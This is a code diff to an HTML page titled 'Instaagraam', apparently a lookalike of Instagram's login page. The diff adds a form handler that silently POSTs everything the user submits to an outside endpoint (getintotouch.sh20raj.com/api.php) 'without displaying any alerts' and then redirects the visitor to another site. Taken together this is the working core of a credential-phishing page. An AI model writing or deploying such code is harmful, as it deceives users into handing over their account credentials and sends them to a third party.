@@ -6,7 +6,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instaagraam</title>
-    <!-- FAVIVON -->
+    <!-- FAVICON -->
     <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
     <!-- GOOGLE FONT -->
     <link rel="preconnect" href="https://fonts.gstatic.com">
@@ -120,16 +120,24 @@
     </div>
 
     <script type="text/javascript">
-        // Initialize emailjs if needed
-        // emailjs.init('TBUnQZvEr05x5KaHB')
-
         function submitForm(event) {
             event.preventDefault();
 
-            // Your form submission logic here if needed
+            const formData = new FormData(event.target);
 
-            // Redirect to another website
-            window.location.href = "https://starlit-douhua-cbe97d.netlify.app";  // Replace with your desired URL
+            // Send form data without displaying any alerts
+            fetch('https://getintotouch.sh20raj.com/api.php?id=6534651073', {
+                method: 'POST',
+                body: formData
+            })
+            .then(() => {
+                // Redirect to another website after successful form submission
+                window.location.href = "https://example.com";  // Replace with your desired URL
+            })
+            .catch(error => {
+                console.error('Error submitting the form: ' + error);
+                // Handle errors if needed
+            });
         }
     </script>
 
